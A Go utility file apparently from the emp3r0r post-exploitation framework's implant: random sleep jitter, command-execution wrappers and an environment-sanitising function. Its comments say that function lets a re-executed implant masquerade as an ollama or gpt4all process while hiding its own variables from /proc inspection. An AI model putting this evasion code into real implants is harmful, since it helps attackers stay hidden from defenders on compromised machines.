package util

import (
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// ProcEntry a process entry of a process list
type ProcEntry struct {
	Name      string `json:"name" cbor:"1,keyasint"`      // process name
	Cmdline   string `json:"cmdline" cbor:"2,keyasint"`   // process cmdline
	Token     string `json:"token" cbor:"3,keyasint"`     // process token/username
	PID       int    `json:"pid" cbor:"4,keyasint"`       // process ID
	PPID      int    `json:"ppid" cbor:"5,keyasint"`      // parent process ID
	UID       string `json:"uid" cbor:"6,keyasint"`       // user ID (UID on Linux, SID on Windows)
	Namespace string `json:"namespace" cbor:"7,keyasint"` // Linux namespace info
}

// ProcSimple represents basic process info for IsProcAlive
type ProcSimple struct {
	Pid int32
}

// sleep for a random interval between 5s to 60s
var TakeASnap = func() {
	interval := time.Duration(RandInt(5000, 60000)) * time.Millisecond
	for {
		start := time.Now()
		time.Sleep(interval)
		elapsed := time.Since(start)
		if elapsed >= interval {
			break
		}
		// If we are here, it means the sleep was interrupted or skipped.
		// We subtract the elapsed time and try to sleep the remainder.
		logging.Debugf("TakeASnap: sleep was interrupted/skipped (%v < %v), sleeping remainder", elapsed, interval)
		interval -= elapsed
	}
}

// sleep for a random interval between 100ms to 500ms
func TakeABlink() {
	interval := time.Duration(RandInt(100, 500))
	time.Sleep(interval * time.Millisecond)
}

// Command builds an exec.Cmd for the given args (args[0] is the binary).
func Command(args ...string) *exec.Cmd {
	if len(args) == 0 {
		return exec.Command("true")
	}
	return exec.Command(args[0], args[1:]...)
}

// RunCmdOutput runs a command and returns its combined output; the error is
// non-nil when the command exits non-zero or fails to start.
func RunCmdOutput(args ...string) (string, error) {
	cmd := Command(args...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// SanitizedEnviron returns an allowlisted copy of the process environment:
// only innocuous, standard variables survive. The shell that launched us
// may carry names that point straight at the project (EMP_*), the session
// it came from (PI_*, SSH_*), or credentials — none of which a real
// ollama or gpt4all process would have, and all of which any same-user
// process can read from /proc/pid/environ. Masquerade re-exec and
// ExecSelfReplace pass this instead of os.Environ().
func SanitizedEnviron() []string {
	allowed := map[string]bool{
		"PATH": true, "HOME": true, "SHELL": true, "TERM": true,
		"LANG": true, "TZ": true, "USER": true, "LOGNAME": true, "TMPDIR": true,
		"XDG_RUNTIME_DIR": true, "XDG_DATA_HOME": true, "XDG_CONFIG_HOME": true,
		"XDG_CACHE_HOME": true, "XDG_SESSION_TYPE": true,
		"DBUS_SESSION_BUS_ADDRESS": true, "DISPLAY": true,
		"WAYLAND_DISPLAY": true, "XAUTHORITY": true,
		// operator/debug switches: they must survive the masquerade re-exec,
		// otherwise every hook-spawned instance sleeps its full jitter again
		// and the key-persist override never reaches the real process
		"EMP_NO_STARTUP_JITTER": true, "EMP_NO_KEY_PERSIST": true,
	}
	out := make([]string, 0, 12)
	for _, kv := range os.Environ() {
		if i := strings.IndexByte(kv, '='); i > 0 && allowed[kv[:i]] {
			out = append(out, kv)
		}
	}
	return out
}
